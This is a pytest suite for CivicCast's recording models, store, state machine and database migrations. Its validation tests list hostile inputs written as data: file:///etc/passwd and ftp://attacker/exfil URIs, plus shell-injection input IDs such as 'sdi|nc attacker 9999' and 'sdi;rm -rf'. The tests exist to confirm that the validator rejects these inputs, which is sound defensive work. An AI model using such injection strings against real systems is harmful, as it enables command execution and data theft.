# SPDX-License-Identifier: Apache-2.0
# Copyright (c) The CivicCast Authors
"""S21 recording data layer — models + RecordingStore + migration 0056 +
the merge revision 0060."""

from __future__ import annotations

from collections.abc import Iterator
from contextlib import contextmanager
from datetime import UTC, datetime, timedelta
from pathlib import Path

import pytest
from alembic import command
from alembic.config import Config
from alembic.script import ScriptDirectory
from sqlalchemy import create_engine, inspect
from sqlalchemy.orm import Session

from civiccast.db import Base
from civiccast.recording.models import (
    JOB_STATE_ACTIVE,
    JOB_STATE_TERMINAL,
    RecordingJob,
    RecordingSchedule,
    RecordingSource,
    RecurrenceSpec,
)
from civiccast.recording.store import (
    RecordingJobIdConflictError,
    RecordingJobNotFoundError,
    RecordingJobOverlapError,
    RecordingJobStateError,
    RecordingScheduleNameConflictError,
    RecordingScheduleNotFoundError,
    RecordingStore,
)

REPO_ROOT = Path(__file__).resolve().parents[2]
ALEMBIC_INI = REPO_ROOT / "alembic.ini"


@pytest.fixture
def store(tmp_path: Path) -> Iterator[RecordingStore]:
    eng = create_engine(f"sqlite:///{tmp_path / 'r.sqlite'}", future=True)
    Base.metadata.create_all(eng)

    @contextmanager
    def factory() -> Iterator[Session]:
        with Session(bind=eng) as sess:
            yield sess

    try:
        yield RecordingStore(factory)
    finally:
        eng.dispose()


def _src(kind: str = "rtsp", **kw) -> RecordingSource:
    base = {"kind": kind}
    if kind in ("sdi", "hdmi", "ndi"):
        base["input_id"] = kw.pop("input_id", "default-input")
    else:
        base["uri"] = kw.pop("uri", f"{kind}://example.local/stream")
    base.update(kw)
    return RecordingSource(**base)  # type: ignore[arg-type]


def _rec_oneshot(start: datetime | None = None) -> RecurrenceSpec:
    return RecurrenceSpec(kind="one_shot", start=start or datetime.now(UTC))


def _schedule(**kw) -> RecordingSchedule:
    base = {
        "schedule_id": "sch-1",
        "station_id": "civiccast-station",
        "name": "Council Tuesdays",
        "source": _src(),
        "recurrence": _rec_oneshot(),
        "duration_seconds": 3600,
        "encoder_profile": "hw-h264-1080p",
    }
    base.update(kw)
    return RecordingSchedule(**base)  # type: ignore[arg-type]


def _job(**kw) -> RecordingJob:
    start = kw.pop("planned_start", None) or datetime.now(UTC)
    base = {
        "job_id": "job-1",
        "station_id": "civiccast-station",
        "schedule_id": "sch-1",
        "planned_start": start,
        "planned_end": start + timedelta(hours=1),
        "source_snapshot": _src(),
        "encoder_profile": "hw-h264-1080p",
    }
    base.update(kw)
    return RecordingJob(**base)  # type: ignore[arg-type]


# --- models -----------------------------------------------------------------


class TestRecordingSource:
    def test_network_stream_requires_uri(self) -> None:
        with pytest.raises(ValueError):
            RecordingSource(kind="rtsp")

    def test_live_input_requires_input_id(self) -> None:
        with pytest.raises(ValueError):
            RecordingSource(kind="sdi")

    def test_rtsp_with_uri_ok(self) -> None:
        s = RecordingSource(kind="rtsp", uri="rtsp://camera.local/feed")
        assert s.uri.startswith("rtsp://")

    def test_sdi_with_input_id_ok(self) -> None:
        s = RecordingSource(kind="sdi", input_id="sdi-1")
        assert s.input_id == "sdi-1"

    def test_extra_field_rejected(self) -> None:
        with pytest.raises(ValueError):
            RecordingSource(kind="rtsp", uri="rtsp://x", evil="payload")  # type: ignore[call-arg]

    # ------------------------------------------------------------------
    # Q-1 / E-2 — URI scheme allowlist
    # ------------------------------------------------------------------

    @pytest.mark.parametrize(
        "kind,uri",
        [
            ("rtsp", "rtsp://camera.local/feed"),
            ("rtsp", "rtsps://camera.local/feed"),
            ("srt", "srt://camera.local:9000"),
            ("hls", "http://camera.local/index.m3u8"),
            ("hls", "https://camera.local/index.m3u8"),
            ("rtmp", "rtmp://camera.local/live"),
            ("rtmp", "rtmps://camera.local/live"),
            ("mpegts", "udp://239.0.0.1:5000"),
            ("mpegts", "rtp://239.0.0.1:5000"),
        ],
    )
    def test_matching_scheme_accepted(self, kind: str, uri: str) -> None:
        s = RecordingSource(kind=kind, uri=uri)  # type: ignore[arg-type]
        assert s.kind == kind

    @pytest.mark.parametrize(
        "kind,uri",
        [
            ("rtsp", "http://camera.local/feed"),
            ("rtsp", "srt://camera.local:9000"),
            ("srt", "rtsp://camera.local/feed"),
            ("hls", "rtsp://camera.local/feed"),
            ("rtmp", "http://camera.local/live"),
            ("mpegts", "rtsp://239.0.0.1:5000"),
        ],
    )
    def test_mismatched_scheme_rejected(self, kind: str, uri: str) -> None:
        with pytest.raises(ValueError):
            RecordingSource(kind=kind, uri=uri)  # type: ignore[arg-type]

    @pytest.mark.parametrize(
        "kind",
        ["rtsp", "srt", "hls", "rtmp", "mpegts"],
    )
    @pytest.mark.parametrize(
        "uri",
        [
            "file:///etc/passwd",
            "javascript:alert(1)",
            "data:text/html;base64,XYZ",
            "gopher://x/_send",
            "dict://x:11211/CONFIG",
            "ftp://attacker/exfil",
        ],
    )
    def test_forbidden_schemes_rejected_on_every_kind(self, kind: str, uri: str) -> None:
        with pytest.raises(ValueError):
            RecordingSource(kind=kind, uri=uri)  # type: ignore[arg-type]

    def test_whitespace_only_uri_rejected(self) -> None:
        with pytest.raises(ValueError):
            RecordingSource(kind="rtsp", uri="   ")

    def test_schemeless_uri_rejected(self) -> None:
        with pytest.raises(ValueError):
            RecordingSource(kind="rtsp", uri="not-a-url")
        with pytest.raises(ValueError):
            RecordingSource(kind="rtsp", uri="camera.local/feed")

    def test_whitespace_around_uri_stripped(self) -> None:
        s = RecordingSource(kind="rtsp", uri="  rtsp://camera.local/feed  ")
        assert s.uri == "rtsp://camera.local/feed"

    # ------------------------------------------------------------------
    # Q-2 — input_id metacharacter rejection
    # ------------------------------------------------------------------

    @pytest.mark.parametrize(
        "input_id",
        [
            "sdi-1 ! filesink location=/tmp/exfil.ts",
            "sdi;rm -rf",
            "sdi|nc attacker 9999",
            "sdi&pwn",
            "sdi$(whoami)",
            "sdi`whoami`",
            "sdi\nmalicious",
            "sdi\x00malicious",
            "../etc/passwd",
            "sdi 1",  # whitespace
            "",
            "   ",
        ],
    )
    def test_dangerous_input_id_rejected(self, input_id: str) -> None:
        with pytest.raises(ValueError):
            RecordingSource(kind="sdi", input_id=input_id)

    @pytest.mark.parametrize(
        "input_id",
        ["sdi-1", "hdmi-a", "ndi.stage-cam.3", "sdi_1", "SDI-A2"],
    )
    def test_safe_input_id_accepted(self, input_id: str) -> None:
        s = RecordingSource(kind="sdi", input_id=input_id)
        assert s.input_id == input_id


class TestRecurrenceSpec:
    def test_one_shot_requires_start(self) -> None:
        with pytest.raises(ValueError):
            RecurrenceSpec(kind="one_shot")

    def test_one_shot_rejects_weekly_fields(self) -> None:
        with pytest.raises(ValueError):
            RecurrenceSpec(
                kind="one_shot",
                start=datetime.now(UTC),
                weekdays=[0],
                time_hhmm="19:00",
            )

    def test_weekly_requires_weekdays(self) -> None:
        with pytest.raises(ValueError):
            RecurrenceSpec(kind="weekly", time_hhmm="19:00")

    def test_weekly_requires_time_hhmm(self) -> None:
        with pytest.raises(ValueError):
            RecurrenceSpec(kind="weekly", weekdays=[1, 3])

    # T-11 fix: parametrize so each bad value reports independently.
    @pytest.mark.parametrize("bad", ["bad", "25:00", "00:60"])
    def test_weekly_validates_time_format(self, bad: str) -> None:
        with pytest.raises(ValueError):
            RecurrenceSpec(kind="weekly", weekdays=[1], time_hhmm=bad)

    def test_weekly_weekdays_deduped_sorted(self) -> None:
        r = RecurrenceSpec(kind="weekly", weekdays=[3, 1, 1, 5], time_hhmm="19:00")
        assert r.weekdays == [1, 3, 5]

    def test_weekdays_out_of_range(self) -> None:
        with pytest.raises(ValueError):
            RecurrenceSpec(kind="weekly", weekdays=[7], time_hhmm="19:00")


class TestQ3CustomFieldValuesCap:
    """Q-3 fix — custom_field_values has a 64 KiB serialized size cap."""

    def test_small_blob_accepted(self) -> None:
        s = _schedule(custom_field_values={"committee": "council", "x": "y"})
        assert s.custom_field_values["committee"] == "council"

    def test_oversized_blob_rejected(self) -> None:
        # Build a >64 KiB serialized blob.
        big = "x" * (70 * 1024)
        with pytest.raises(ValueError):
            _schedule(custom_field_values={"oversized": big})

    def test_non_serializable_rejected(self) -> None:
        # A datetime would normally serialize via pydantic, but a raw
        # object should not. Use a set since `set` is not JSON-serializable.
        with pytest.raises(ValueError):
            _schedule(custom_field_values={"bad": {1, 2, 3}})


class TestQ4TargetSeries:
    """Q-4 fix — target_series rejects path-traversal and cross-station shapes."""

    @pytest.mark.parametrize(
        "bad",
        [
            "../../other-station/series-foo",
            "station-b:series-x",
            "/abs/path",
            "Series With Spaces",
            "series/with/slash",
        ],
    )
    def test_dangerous_target_series_rejected(self, bad: str) -> None:
        with pytest.raises(ValueError):
            _schedule(target_series=bad)

    @pytest.mark.parametrize("good", ["council", "council-2026", "series_a", "x"])
    def test_safe_target_series_accepted(self, good: str) -> None:
        s = _schedule(target_series=good)
        assert s.target_series == good

    def test_null_target_series_accepted(self) -> None:
        s = _schedule(target_series=None)
        assert s.target_series is None


class TestRecordingScheduleModel:
    def test_minimal_valid(self) -> None:
        s = _schedule()
        assert s.enabled is True
        assert s.loudness_regime == "inherit"
        assert s.target_series is None

    def test_duration_lower_bound(self) -> None:
        with pytest.raises(ValueError):
            _schedule(duration_seconds=59)

    def test_duration_upper_bound(self) -> None:
        with pytest.raises(ValueError):
            _schedule(duration_seconds=13 * 3600)

    def test_uppercase_id_rejected(self) -> None:
        with pytest.raises(ValueError):
            _schedule(schedule_id="SCH-Bad")

    @pytest.mark.parametrize("profile", ["sw-h264-1080p", "cable-mpeg2-1080i", "unknown"])
    def test_unsupported_encoder_profile_rejected(self, profile: str) -> None:
        with pytest.raises(ValueError, match="unsupported encoder_profile"):
            _schedule(encoder_profile=profile)

    @pytest.mark.parametrize("regime", ["cable", "web", "unknown"])
    def test_unsupported_loudness_regime_rejected(self, regime: str) -> None:
        with pytest.raises(ValueError, match="unsupported loudness_regime"):
            _schedule(loudness_regime=regime)

    def test_supported_capture_values_are_accepted(self) -> None:
        s = _schedule(encoder_profile="h264-1080p", loudness_regime="atsc-a85")
        assert s.encoder_profile == "h264-1080p"
        assert s.loudness_regime == "atsc-a85"


class TestRecordingJobModel:
    def test_minimal_valid(self) -> None:
        j = _job()
        assert j.state == "scheduled"
        assert j.bytes_written == 0
        assert j.asset_id is None

    def test_window_must_be_positive(self) -> None:
        with pytest.raises(ValueError):
            now = datetime.now(UTC)
            RecordingJob(
                job_id="j-x",
                station_id="sta",
                planned_start=now,
                planned_end=now,
                source_snapshot=_src(),
                encoder_profile="e",
            )

    def test_state_constants(self) -> None:
        assert "recording" in JOB_STATE_ACTIVE
        assert "done" in JOB_STATE_TERMINAL


# --- store: schedules -------------------------------------------------------


class TestScheduleCrud:
    def test_upsert_then_get(self, store: RecordingStore) -> None:
        store.upsert_schedule(_schedule())
        loaded = store.get_schedule("sch-1")
        assert loaded is not None
        assert loaded.name == "Council Tuesdays"

    def test_upsert_idempotent(self, store: RecordingStore) -> None:
        store.upsert_schedule(_schedule())
        store.upsert_schedule(_schedule(enabled=False))
        loaded = store.get_schedule("sch-1")
        assert loaded.enabled is False  # type: ignore[union-attr]

    def test_duplicate_name_same_station_conflicts(self, store: RecordingStore) -> None:
        store.upsert_schedule(_schedule(schedule_id="sch-a", name="Same Name"))
        with pytest.raises(RecordingScheduleNameConflictError):
            store.upsert_schedule(_schedule(schedule_id="sch-b", name="Same Name"))

    def test_duplicate_name_different_station_ok(self, store: RecordingStore) -> None:
        store.upsert_schedule(_schedule(schedule_id="sch-a", name="Council"))
        store.upsert_schedule(
            _schedule(
                schedule_id="sch-b",
                station_id="other-station",
                name="Council",
            )
        )
        assert store.get_schedule("sch-a") is not None
        assert store.get_schedule("sch-b") is not None

    def test_list_filters_by_station(self, store: RecordingStore) -> None:
        store.upsert_schedule(_schedule(schedule_id="sch-a", name="A"))
        store.upsert_schedule(_schedule(schedule_id="sch-b", station_id="other-station", name="B"))
        assert len(store.list_schedules("civiccast-station")) == 1
        assert len(store.list_schedules("other-station")) == 1

    def test_list_enabled_only(self, store: RecordingStore) -> None:
        store.upsert_schedule(_schedule(schedule_id="sch-a", name="A", enabled=True))
        store.upsert_schedule(_schedule(schedule_id="sch-b", name="B", enabled=False))
        assert len(store.list_schedules("civiccast-station")) == 2
        assert len(store.list_schedules("civiccast-station", enabled_only=True)) == 1

    def test_delete(self, store: RecordingStore) -> None:
        store.upsert_schedule(_schedule())
        store.delete_schedule("sch-1")
        assert store.get_schedule("sch-1") is None

    def test_delete_unknown_raises(self, store: RecordingStore) -> None:
        with pytest.raises(RecordingScheduleNotFoundError):
            store.delete_schedule("missing")


# --- store: jobs ------------------------------------------------------------


class TestJobCrud:
    def test_create_then_get(self, store: RecordingStore) -> None:
        store.create_job(_job())
        loaded = store.get_job("job-1")
        assert loaded is not None
        assert loaded.state == "scheduled"

    def test_list_orders_newest_first(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        store.create_job(_job(job_id="old", planned_start=now - timedelta(days=2)))
        store.create_job(_job(job_id="new", planned_start=now + timedelta(days=2)))
        results = store.list_jobs("civiccast-station")
        assert results[0].job_id == "new"
        assert results[1].job_id == "old"

    def test_list_filter_by_state(self, store: RecordingStore) -> None:
        store.create_job(_job(job_id="j-a"))
        store.create_job(_job(job_id="j-b"))
        store.set_job_state("j-b", "arming")
        assert len(store.list_jobs("civiccast-station", state="scheduled")) == 1
        assert len(store.list_jobs("civiccast-station", state="arming")) == 1

    def test_list_filter_by_schedule(self, store: RecordingStore) -> None:
        store.create_job(_job(job_id="j-a", schedule_id="sch-a"))
        store.create_job(_job(job_id="j-b", schedule_id="sch-b"))
        results = store.list_jobs("civiccast-station", schedule_id="sch-a")
        assert len(results) == 1
        assert results[0].job_id == "j-a"


class TestJobStateMachine:
    def test_happy_path_scheduled_to_done(self, store: RecordingStore) -> None:
        store.create_job(_job())
        store.set_job_state("job-1", "arming")
        store.set_job_state("job-1", "recording", started_at=datetime.now(UTC))
        store.set_job_state("job-1", "finalizing")
        store.set_job_state(
            "job-1",
            "done",
            ended_at=datetime.now(UTC),
            asset_id="asset-123",
            bytes_written=987654321,
        )
        final = store.get_job("job-1")
        assert final.state == "done"  # type: ignore[union-attr]
        assert final.asset_id == "asset-123"  # type: ignore[union-attr]

    def test_invalid_transition_rejected(self, store: RecordingStore) -> None:
        store.create_job(_job())
        with pytest.raises(RecordingJobStateError):
            # Can't go straight to done.
            store.set_job_state("job-1", "done")

    def test_done_is_terminal(self, store: RecordingStore) -> None:
        store.create_job(_job())
        store.set_job_state("job-1", "arming")
        store.set_job_state("job-1", "recording")
        store.set_job_state("job-1", "finalizing")
        store.set_job_state("job-1", "done")
        with pytest.raises(RecordingJobStateError):
            store.set_job_state("job-1", "recording")

    def test_failed_from_any_active_state(self, store: RecordingStore) -> None:
        # From scheduled
        store.create_job(_job(job_id="j-a"))
        store.set_job_state("j-a", "failed", failure_reason="source unreachable")
        # From arming
        store.create_job(_job(job_id="j-b"))
        store.set_job_state("j-b", "arming")
        store.set_job_state("j-b", "failed", failure_reason="arm failed")
        # From recording
        store.create_job(_job(job_id="j-c"))
        store.set_job_state("j-c", "arming")
        store.set_job_state("j-c", "recording")
        store.set_job_state("j-c", "failed", failure_reason="disk full")
        # All three have failure_reason set
        for jid in ("j-a", "j-b", "j-c"):
            j = store.get_job(jid)
            assert j.failure_reason is not None  # type: ignore[union-attr]
            assert j.state == "failed"  # type: ignore[union-attr]

    def test_skipped_from_scheduled_or_arming(self, store: RecordingStore) -> None:
        store.create_job(_job())
        store.set_job_state("job-1", "skipped")
        # A prearmed job can still be cancelled before capture starts.
        store.create_job(_job(job_id="j-b"))
        store.set_job_state("j-b", "arming")
        skipped = store.set_job_state("j-b", "skipped")
        assert skipped.state == "skipped"

    def test_set_state_unknown_job(self, store: RecordingStore) -> None:
        with pytest.raises(RecordingJobNotFoundError):
            store.set_job_state("missing", "arming")


class TestOverlapDetection:
    def test_no_overlap_returns_empty(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        store.create_job(
            _job(
                job_id="j-a",
                planned_start=now,
                planned_end=now + timedelta(hours=1),
            )
        )
        # 2h later, no overlap.
        overlaps = store.find_overlapping_jobs(
            "civiccast-station",
            _src(uri="rtsp://example.local/stream"),
            now + timedelta(hours=2),
            now + timedelta(hours=3),
        )
        assert overlaps == []

    def test_overlap_returns_match(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        store.create_job(
            _job(
                job_id="j-a",
                planned_start=now,
                planned_end=now + timedelta(hours=2),
            )
        )
        # 30 min in, 30 min out — overlap.
        overlaps = store.find_overlapping_jobs(
            "civiccast-station",
            _src(uri="rtsp://example.local/stream"),
            now + timedelta(minutes=30),
            now + timedelta(hours=1, minutes=30),
        )
        assert len(overlaps) == 1
        assert overlaps[0].job_id == "j-a"

    def test_different_source_not_overlap(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        store.create_job(
            _job(
                job_id="j-a",
                planned_start=now,
                planned_end=now + timedelta(hours=1),
                source_snapshot=_src(uri="rtsp://camera-a/feed"),
            )
        )
        overlaps = store.find_overlapping_jobs(
            "civiccast-station",
            _src(uri="rtsp://camera-b/feed"),
            now + timedelta(minutes=10),
            now + timedelta(minutes=50),
        )
        assert overlaps == []

    def test_terminal_state_excluded(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        store.create_job(
            _job(
                job_id="j-a",
                planned_start=now,
                planned_end=now + timedelta(hours=1),
            )
        )
        # Done jobs don't block overlap.
        store.set_job_state("j-a", "arming")
        store.set_job_state("j-a", "recording")
        store.set_job_state("j-a", "finalizing")
        store.set_job_state("j-a", "done")
        overlaps = store.find_overlapping_jobs(
            "civiccast-station",
            _src(uri="rtsp://example.local/stream"),
            now + timedelta(minutes=10),
            now + timedelta(minutes=50),
        )
        assert overlaps == []

    def test_exclude_self(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        store.create_job(
            _job(
                job_id="j-a",
                planned_start=now,
                planned_end=now + timedelta(hours=1),
            )
        )
        overlaps = store.find_overlapping_jobs(
            "civiccast-station",
            _src(uri="rtsp://example.local/stream"),
            now,
            now + timedelta(hours=1),
            exclude_job_id="j-a",
        )
        assert overlaps == []


class TestOrphanReconcile:
    def test_orphaned_recording_past_window_fails(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        store.create_job(
            _job(
                job_id="j-a",
                planned_start=now - timedelta(hours=2),
                planned_end=now - timedelta(hours=1),
            )
        )
        store.set_job_state("j-a", "arming")
        store.set_job_state("j-a", "recording")
        # Now reconcile — past its planned_end → should be marked failed.
        transitioned = store.reconcile_orphaned_active_jobs(now=now)
        assert transitioned == 1
        j = store.get_job("j-a")
        assert j.state == "failed"  # type: ignore[union-attr]
        assert "Interrupted" in (j.failure_reason or "")  # type: ignore[union-attr]

    def test_active_within_window_not_failed(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        store.create_job(
            _job(
                job_id="j-a",
                planned_start=now - timedelta(minutes=10),
                planned_end=now + timedelta(minutes=50),
            )
        )
        store.set_job_state("j-a", "arming")
        store.set_job_state("j-a", "recording")
        transitioned = store.reconcile_orphaned_active_jobs(now=now)
        assert transitioned == 0
        j = store.get_job("j-a")
        assert j.state == "recording"  # type: ignore[union-attr]


# --- store: typed errors (E-1, E-3, E-6, E-7) -------------------------------


class TestE6CreateJobIdConflict:
    """E-6 fix — PK collision on create_job raises typed error, not raw IntegrityError."""

    def test_duplicate_job_id_raises_typed(self, store: RecordingStore) -> None:
        store.create_job(_job(job_id="dup-1"))
        with pytest.raises(RecordingJobIdConflictError):
            store.create_job(_job(job_id="dup-1"))


class TestE7OverlapDetectionSqlPushdown:
    """E-7 fix — find_overlapping_jobs uses SQL state + window filters.

    Smoke-tests the result-set shape; the perf improvement is provable
    only against a large dataset. We verify that:

    * Active states (scheduled/arming/recording/finalizing) are included.
    * Terminal states are excluded.
    * Jobs outside the planned window are excluded.
    """

    def test_active_states_returned(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        # arming, recording, finalizing — all should be visible.
        store.create_job(
            _job(job_id="j-sched", planned_start=now, planned_end=now + timedelta(hours=1))
        )
        store.create_job(
            _job(job_id="j-arm", planned_start=now, planned_end=now + timedelta(hours=1))
        )
        store.set_job_state("j-arm", "arming")
        store.create_job(
            _job(job_id="j-rec", planned_start=now, planned_end=now + timedelta(hours=1))
        )
        store.set_job_state("j-rec", "arming")
        store.set_job_state("j-rec", "recording")
        overlaps = store.find_overlapping_jobs(
            "civiccast-station",
            _src(uri="rtsp://example.local/stream"),
            now + timedelta(minutes=10),
            now + timedelta(minutes=50),
        )
        ids = {o.job_id for o in overlaps}
        assert "j-sched" in ids
        assert "j-arm" in ids
        assert "j-rec" in ids

    def test_jobs_outside_window_not_returned(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        store.create_job(
            _job(
                job_id="j-far",
                planned_start=now + timedelta(hours=5),
                planned_end=now + timedelta(hours=6),
            )
        )
        overlaps = store.find_overlapping_jobs(
            "civiccast-station",
            _src(uri="rtsp://example.local/stream"),
            now,
            now + timedelta(hours=1),
        )
        assert overlaps == []


class TestE3OverlapGuardAtomicTransition:
    """E-3 fix — transition_to_arming_with_overlap_guard catches concurrent races."""

    def test_happy_path_transitions_to_arming(self, store: RecordingStore) -> None:
        store.create_job(_job(job_id="j-a"))
        result = store.transition_to_arming_with_overlap_guard("j-a")
        assert result.state == "arming"

    def test_overlap_raises_typed_error(self, store: RecordingStore) -> None:
        now = datetime.now(UTC)
        store.create_job(
            _job(
                job_id="j-existing",
                planned_start=now,
                planned_end=now + timedelta(hours=1),
            )
        )
        # First job: arm it so it occupies the source.
        store.transition_to_arming_with_overlap_guard("j-existing")
        # Second job: overlaps on the same source, same window.
        store.create_job(
            _job(
                job_id="j-collide",
                planned_start=now + timedelta(minutes=10),
                planned_end=now + timedelta(minutes=50),
            )
        )
        with pytest.raises(RecordingJobOverlapError):
            store.transition_to_arming_with_overlap_guard("j-collide")

    def test_concurrent_arm_only_one_wins(self, store: RecordingStore) -> None:
        """Sanity check for the concurrent path. We don't drive real
        threads here — the in-transaction overlap re-check means the
        second caller sees the first's transition + raises. A genuine
        race would also be caught by the partial unique index in
        production (PG only)."""
        now = datetime.now(UTC)
        store.create_job(
            _job(
                job_id="j-a",
                planned_start=now,
                planned_end=now + timedelta(hours=1),
            )
        )
        store.create_job(
            _job(
                job_id="j-b",
                planned_start=now,
                planned_end=now + timedelta(hours=1),
            )
        )
        store.transition_to_arming_with_overlap_guard("j-a")
        with pytest.raises(RecordingJobOverlapError):
            store.transition_to_arming_with_overlap_guard("j-b")

    def test_unknown_job_raises_not_found(self, store: RecordingStore) -> None:
        with pytest.raises(RecordingJobNotFoundError):
            store.transition_to_arming_with_overlap_guard("missing")

    def test_wrong_state_raises_state_error(self, store: RecordingStore) -> None:
        store.create_job(_job(job_id="j-a"))
        store.set_job_state("j-a", "arming")
        with pytest.raises(RecordingJobStateError):
            store.transition_to_arming_with_overlap_guard("j-a")


# --- migration --------------------------------------------------------------


def _make_cfg(db_url: str) -> Config:
    cfg = Config(str(ALEMBIC_INI))
    cfg.set_main_option("sqlalchemy.url", db_url)
    return cfg


class TestMigration0056AndMerge:
    def test_upgrade_head_creates_two_tables(self, tmp_path: Path) -> None:
        url = f"sqlite:///{tmp_path / 'mig.sqlite'}"
        cfg = _make_cfg(url)
        command.upgrade(cfg, "head")
        eng = create_engine(url, future=True)
        names = set(inspect(eng).get_table_names())
        eng.dispose()
        assert "recording_schedules" in names
        assert "recording_jobs" in names

    def test_repository_has_single_current_head(self, tmp_path: Path) -> None:
        cfg = _make_cfg(f"sqlite:///{tmp_path / 'mig2.sqlite'}")
        script = ScriptDirectory.from_config(cfg)
        heads = script.get_heads()
        # Alembic returns a tuple in newer versions and a list in older.
        # Normalize before comparing. Updated to 0068_migrate_batches (agenda import; prev. live-HLS
        # packaging: new "hls" egress sink kind), chained after
        # 0065_recording_dropout_fields. Updated to
        # 0070_grandfather_scheduled_to_published for Commit-to-Air
        # enforcement (owner decision 2026-07-08), chained after
        # 0068_migrate_batches (0069 reserved by an in-flight control_room
        # branch). Updated to 0071_published_blocks_overlap (same owner
        # decision; widens the schedule_items_no_overlap EXCLUDE to also
        # block on published items), chained after 0070. Updated to
        # 0073_egress_allow_software_fallback (win-encoder-remap slice; adds
        # allow_software_fallback to egress_configs), chained after 0071.
        # (Renumbered from 0072 -> 0073 on this branch to avoid colliding
        # with main's unmerged, independently-numbered
        # 0072_normalize_recording_file_uris; the 0072 slot is deliberately
        # unused here until the merge commit re-chains onto main's 0072.)
        # 0074_caption_review_audio_evidence adds caption review audio
        # evidence; 0075_offline_caption_jobs adds the offline caption job
        # queue (keystone K3). 0076_analytics_viewership (S14 — durable
        # viewership_events/viewership_rollups/analytics_report_snapshots)
        # chains after 0075. 0078_agenda_item_confidence (product-hole fix:
        # adds agenda_items.confidence for the PDF-agenda-import heuristic)
        # chains after 0076_analytics_viewership. Renumbered from its
        # original 0076 after PR #20 merged first and independently claimed
        # that slot; 0077 is reserved for feat/s7-media-lifecycle.
        # 0080_watch_folder_daemon (S7 watch-folder daemon; prior head
        # net-new S7 tables + asset_archive_proofs + media_lifecycle_audit_log,
        # plus assets.legal_hold/legal_hold_reason) is rechained after
        # 0078_agenda_item_confidence (rather than the original 0076) so it
        # lands after the already-merged 0078. Updated to
        # 0082_egress_graphics_overlay (async summary generation job -- field
        # evidence, candidate #17: civiccast/summary/job.py), chained after
        # 0080_watch_folder_daemon. Updated to 0083_caption_review_language
        # (recorded-Spanish captions: a language column on
        # caption_review_items), chained after 0082_egress_graphics_overlay.
        # Updated to 0086_live_source_probe_state (WP-07 / audit ENG-003:
        # observed-readiness columns on live_sources), chained after
        # 0083_caption_review_language -- WP-05's 0085 is parked by owner
        # decision and will not land, and 0084 never materialized, so 0083
        # was the sole other head when this branch re-parented onto it.
        # 0087_retention_terms added asset retention terms, 0088 added the
        # caption-health alert defaults, and 0089 records unverified remote
        # guest media-control requests. 0090 indexes consumed egress commands
        # for bounded history pruning; later delivery-outcome migrations follow it.
        # Beta 19 adds board audio gain (0093) and live-video zones (0094).
        assert list(heads) == ["0099_audio_description_model"], (
            f"Expected single head 0099_audio_description_model, got {heads!r}"
        )

    def test_0056_down_revision_is_0055(self, tmp_path: Path) -> None:
        cfg = _make_cfg(f"sqlite:///{tmp_path / 'mig3.sqlite'}")
        script = ScriptDirectory.from_config(cfg)
        rev = script.get_revision("0056_scheduled_recording")
        # Sibling slot off 0055.
        assert rev.down_revision == "0055_asrun_and_epg"

    def test_merge_unifies_0056_and_0059(self, tmp_path: Path) -> None:
        cfg = _make_cfg(f"sqlite:///{tmp_path / 'mig4.sqlite'}")
        script = ScriptDirectory.from_config(cfg)
        rev = script.get_revision("0060_recording_paywall_merge")
        # Down-revision is a tuple of the two branch heads.
        assert isinstance(rev.down_revision, tuple)
        assert set(rev.down_revision) == {
            "0056_scheduled_recording",
            "0059_paywall_access",
        }

    def test_downgrade_just_below_merge_drops_recording_tables(self, tmp_path: Path) -> None:
        url = f"sqlite:///{tmp_path / 'mig5.sqlite'}"
        cfg = _make_cfg(url)
        command.upgrade(cfg, "head")
        # Downgrade the merge + the recording branch sibling. Alembic
        # downgrades the merge first (no-op) then pops 0056 off its branch,
        # leaving the linear chain 0054 → 0055 → 0057 → 0058 → 0059 intact.
        command.downgrade(cfg, "0055_asrun_and_epg")
        eng = create_engine(url, future=True)
        names = set(inspect(eng).get_table_names())
        eng.dispose()
        # The recording tables came in via 0056 — gone now.
        assert "recording_schedules" not in names
        assert "recording_jobs" not in names

    def test_upgrade_from_0059_through_merge_is_idempotent(self, tmp_path: Path) -> None:
        """E-17 fix — production DBs at 0059 must upgrade through the
        two-headed-then-merged chain without surprises. Both branches
        upgrade no-op once 0056 ran; verify the recording tables land
        when we start from 0059 just as cleanly as a fresh DB."""
        url = f"sqlite:///{tmp_path / 'mig6.sqlite'}"
        cfg = _make_cfg(url)
        # Stamp/upgrade to 0059 (pre-S21 head). Recording tables MUST
        # not exist yet.
        command.upgrade(cfg, "0059_paywall_access")
        eng = create_engine(url, future=True)
        names_at_0059 = set(inspect(eng).get_table_names())
        assert "recording_schedules" not in names_at_0059
        assert "recording_jobs" not in names_at_0059
        eng.dispose()
        # Now upgrade through the sibling 0056 + the merge 0060 to head.
        command.upgrade(cfg, "head")
        eng = create_engine(url, future=True)
        names_at_head = set(inspect(eng).get_table_names())
        eng.dispose()
        assert "recording_schedules" in names_at_head
        assert "recording_jobs" in names_at_head
